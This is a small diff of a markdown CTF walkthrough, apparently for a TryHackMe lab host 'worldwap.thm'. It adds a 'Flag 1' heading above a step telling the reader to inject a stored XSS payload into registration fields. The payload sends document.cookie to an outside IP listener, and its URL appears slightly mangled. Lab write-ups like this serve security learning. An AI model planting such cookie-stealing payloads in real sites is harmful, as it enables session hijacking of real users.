@@ -28,6 +28,7 @@ Add the file to host name **`echo "$IP worldwap.thm" >> /etc/hosts"`**
 
   <img width="1098" height="804" alt="Screenshot 2026-03-11 132302" src="https://github.com/user-attachments/assets/668df3d1-afc5-4edb-b207-207416d05836" />
 
+### Flag 1
 - Navigate to http://worldwap.thm and click the Register link. On the Register link, inject this payload into either (or both) of the **email** & **Name** fields: **`<script>fetch('http://10.112.108.176:5555eal?c='+document.cookie)</script>`**
 
 <img width="1496" height="713" alt="Screenshot 2026-03-11 132804" src="https://github.com/user-attachments/assets/37c81422-9563-4feb-a2bd-335c9d17858e" />
